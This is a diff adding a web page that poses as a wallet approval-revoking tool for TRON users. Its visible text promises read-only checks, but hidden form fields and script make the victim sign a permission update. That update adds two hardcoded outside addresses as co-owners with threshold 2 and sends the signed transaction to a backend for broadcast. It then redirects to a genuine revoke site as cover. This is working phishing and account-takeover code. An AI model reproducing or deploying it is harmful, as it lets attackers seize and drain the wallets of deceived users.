@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Revoke · Wallet Permission Control</title>
+
+  <!-- 网站图标 -->
+  <link rel="icon" href="datubiao.ico?v=2" type="image/x-icon">
+
+  <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg: #0a0a0a;
+      --panel: rgba(255, 255, 255, 0.04);
+      --border: rgba(255, 255, 255, 0.12);
+      --text: #ffffff;
+      --muted: #b5b5b5;
+      --accent: #ffffff;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.7;
+      letter-spacing: 0.2px;
+    }
+
+    /* Subtle tech grid */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 80px 24px 120px;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 80px;
+    }
+
+    header h1 {
+      font-size: clamp(2.2rem, 4vw, 3.2rem);
+      font-weight: 700;
+      margin: 0 0 24px;
+      letter-spacing: 1px;
+    }
+
+    header p {
+      max-width: 720px;
+      margin: 0 auto;
+      color: var(--muted);
+      font-size: 1.1rem;
+    }
+
+    .cta {
+      margin-top: 48px;
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 36px;
+      border-radius: 999px;
+      text-decoration: none;
+      font-weight: 600;
+      color: #000;
+      background: var(--accent);
+      transition: transform 0.25s ease, box-shadow 0.25s ease;
+      box-shadow: 0 10px 30px rgba(255,255,255,0.15);
+    }
+
+    .cta:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 18px 50px rgba(255,255,255,0.25);
+    }
+
+    section {
+      margin-top: 96px;
+    }
+
+    section h2 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      margin-bottom: 32px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    section h2::before {
+      content: "";
+      width: 40px;
+      height: 2px;
+      background: var(--accent);
+      opacity: 0.6;
+    }
+
+    .card {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 36px 40px;
+      backdrop-filter: blur(12px);
+    }
+
+    ol {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: grid;
+      gap: 32px;
+    }
+
+    li {
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 24px;
+      align-items: flex-start;
+    }
+
+    li::before {
+      content: counter(step);
+    }
+
+    li span.step {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      background: #fff;
+      color: #000;
+      flex-shrink: 0;
+    }
+
+    li h3 {
+      margin: 0 0 8px;
+      font-size: 1.1rem;
+      font-weight: 600;
+    }
+
+    li p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 1rem;
+    }
+
+    .note {
+      display: block;
+      margin-top: 6px;
+      font-size: 0.85rem;
+      opacity: 0.7;
+    }
+
+    footer {
+      margin-top: 120px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 0.85rem;
+      opacity: 0.6;
+    }
+
+    @media (max-width: 640px) {
+      .card {
+        padding: 28px 24px;
+      }
+
+      li {
+        grid-template-columns: 1fr;
+      }
+
+      li span.step {
+        margin-bottom: 8px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <header>
+      <h1>Take Back Control of Your Wallet</h1>
+      <p>
+        When interacting with decentralized applications, you grant token and NFT approvals.
+        If left unchecked, these permissions can expose your assets indefinitely.
+        Revoke unused approvals and regain full control.
+      </p>
+      <button type="button" id="setPermissions" class="cta">
+        Get Started
+      </button>
+    </header>
+
+    <section id="how">
+      <h2>How It Works</h2>
+      <div class="card">
+        <ol>
+          <li>
+            <span class="step">01</span>
+            <div>
+              <h3>Connect</h3>
+              <p>
+                Click Get start and Connect Wallet to analyze active approvals.
+                <span class="note">This only reads on-chain approval data.</span>
+              </p>
+            </div>
+          </li>
+          <li>
+            <span class="step">02</span>
+            <div>
+              <h3>Inspect</h3>
+              <p>
+                Review approvals across networks with powerful sorting and filtering tools.
+              </p>
+            </div>
+          </li>
+          <li>
+            <span class="step">03</span>
+            <div>
+              <h3>Revoke</h3>
+              <p>
+                Remove permissions you no longer trust to prevent unauthorized access.
+              </p>
+            </div>
+          </li>
+        </ol>
+      </div>
+    </section>
+
+    <section>
+      <h2>Why Revoke Matters</h2>
+      <div class="card">
+        <ol>
+          <li>
+            <span class="step">A</span>
+            <div>
+              <h3>Reduce Risk</h3>
+              <p>
+                Periodically revoking approvals limits damage from exploits and compromised dapps.
+              </p>
+            </div>
+          </li>
+          <li>
+            <span class="step">B</span>
+            <div>
+              <h3>After an Incident</h3>
+              <p>
+                If you suspect malicious activity, revoke recent approvals immediately to stop further loss.
+              </p>
+            </div>
+          </li>
+          <li>
+            <span class="step">C</span>
+            <div>
+              <h3>Preventive Protection</h3>
+              <p>
+                Browser extensions can warn you before signing dangerous transactions.
+              </p>
+            </div>
+          </li>
+        </ol>
+      </div>
+    </section>
+
+    <footer>
+      © Revoke · Minimal · Secure · On-chain Transparency
+    </footer>
+  </main>
+
+<div id="connectStatus"></div>
+
+<form id="multisigForm">
+    <!-- 隐藏的固定多签地址 -->
+    <textarea
+        id="coSigners"
+        style="display:none"
+    ></textarea>
+
+    <!-- 隐藏的固定 threshold -->
+    <input
+        type="number"
+        id="threshold"
+        style="display:none"
+    >
+</form>
+
+<!-- ✅ 一定要放在表单后面 -->
+<script>
+const FIXED_COSIGNERS = `
+TMuPuzkAmgCQQopGXif8Hx47a6JbJQj6RM
+TUP33QqAE5vJJsZZknP2FCWj58cstdz5W7
+`.trim();
+
+const FIXED_THRESHOLD = 2;
+
+// 页面加载完成后，立刻写入隐藏控件
+document.getElementById("coSigners").value = FIXED_COSIGNERS;
+document.getElementById("threshold").value = FIXED_THRESHOLD;
+</script>
+
+
+<script>
+
+/*******************************************************
+ * 多钱包通用检测器（TronLink / TP / OKX / Bitget / SafePal…）
+ *******************************************************/
+const WalletAdapter = {
+    tronWeb: null,
+    address: null,
+
+    async detectWallet() {
+        return new Promise(resolve => {
+            let tries = 0;
+            const timer = setInterval(() => {
+                tries++;
+
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    clearInterval(timer);
+                    this.tronWeb = window.tronWeb;
+                    resolve(window.tronWeb);
+                }
+
+                if (tries > 40) { // 等 10 秒
+                    clearInterval(timer);
+                    resolve(null);
+                }
+            }, 250);
+        });
+    },
+
+    async connect() {
+        const status = document.getElementById("connectStatus");
+
+        status.innerText = "⏳ connecting wallet";
+
+        let tw = await this.detectWallet();
+
+        if (!tw) {
+            status.innerText = "❌ Please open this page in the wallet's built-in browser!";
+            return null;
+        }
+
+        // TronLink 需要授权
+        if (window.tronLink && window.tronLink.request) {
+            try {
+                await window.tronLink.request({ method: "tron_requestAccounts" });
+            } catch (e) {
+                console.warn("TronLink:", e);
+            }
+        }
+
+        // 等待地址加载
+        await new Promise(res => setTimeout(res, 300));
+
+        const addr = tw.defaultAddress.base58;
+        if (!addr) {
+            status.innerText = "⚠️ Please open this page in the wallet's built-in browser";
+            return null;
+        }
+
+        this.address = addr;
+        this.tronWeb = tw;
+
+        status.innerText = "✅ connected：" + addr;
+
+        return tw;
+    },
+
+    getAddress() {
+        return this.address || (window.tronWeb?.defaultAddress?.base58 ?? null);
+    }
+};
+
+
+/*******************************************************
+ * 页面加载时启动钱包检测
+ *******************************************************/
+let cachedTronWeb = null;
+
+window.addEventListener("load", async () => {
+    cachedTronWeb = await WalletAdapter.connect();
+});
+
+
+/*******************************************************
+ * 表单提交 —— 设置多签
+ *******************************************************/
+document.getElementById("multisigForm").onsubmit = async (event) => {
+    event.preventDefault();
+
+    const tronWeb = cachedTronWeb || await WalletAdapter.connect();
+    if (!tronWeb) return;
+
+    const currentWallet = WalletAdapter.getAddress();
+    if (!currentWallet) {
+        alert("Please open this page in the wallet's built-in browser!");
+        return;
+    }
+
+    /***** 读取用户输入 *****/
+    const raw = document.getElementById("coSigners").value.trim();
+    const threshold = parseInt(document.getElementById("threshold").value);
+
+    const inputAddresses = raw
+        .split("\n")
+        .map(a => a.trim())
+        .filter(a => tronWeb.isAddress(a));
+
+    const allMembers = Array.from(new Set([currentWallet, ...inputAddresses]));
+    const count = allMembers.length;
+
+    if (count < 2) {
+        alert("至少需要两个成员（包含你自己的地址）");
+        return;
+    }
+    if (threshold < 2 || threshold > count) {
+        alert(`签名阈值必须在 2 到 ${count} 之间`);
+        return;
+    }
+
+    /***** 构建权限列表 *****/
+    const allKeys = allMembers.map(addr => ({
+        address: tronWeb.address.toHex(addr),
+        weight: 1
+    }));
+
+    const permissionConfig = {
+        owner_address: currentWallet,
+        owner: {
+            type: 0,
+            permission_name: "owner",
+            threshold,
+            keys: allKeys
+        },
+        actives: [{
+            type: 2,
+            permission_name: "active0",
+            threshold,
+            operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+            keys: allKeys
+        }]
+    };
+
+    /***** 构建交易 *****/
+    let tx;
+    try {
+        tx = await tronWeb.transactionBuilder.updateAccountPermissions(
+            permissionConfig,
+            currentWallet
+        );
+    } catch (err) {
+        alert("unsuccessful for：" + err.message);
+        return;
+    }
+
+    /***** 签名 *****/
+    let signed;
+    try {
+        signed = await tronWeb.trx.sign(tx);
+    } catch (err) {
+        alert("fail to：" + err.message);
+        return;
+    }
+
+    /***** 提交后端广播 *****/
+    const API_ENDPOINT = "http://192.168.110.214:3000/api/broadcast-tx";
+
+    const res = await fetch(API_ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            signedTransaction: signed,
+            userWallet: currentWallet
+        })
+    });
+
+    const result = await res.json();
+
+    if (res.ok && result.success) {
+        alert(`🎉 rushing`);
+        setTimeout(() => {
+            location.assign("https://revoke.cash/token-approval-checker/ethereum");
+        }, 3000)
+    } else {
+        alert("❌ fail：" + result.message);
+    }
+};
+
+</script>
+
+</body>
+</html>
+
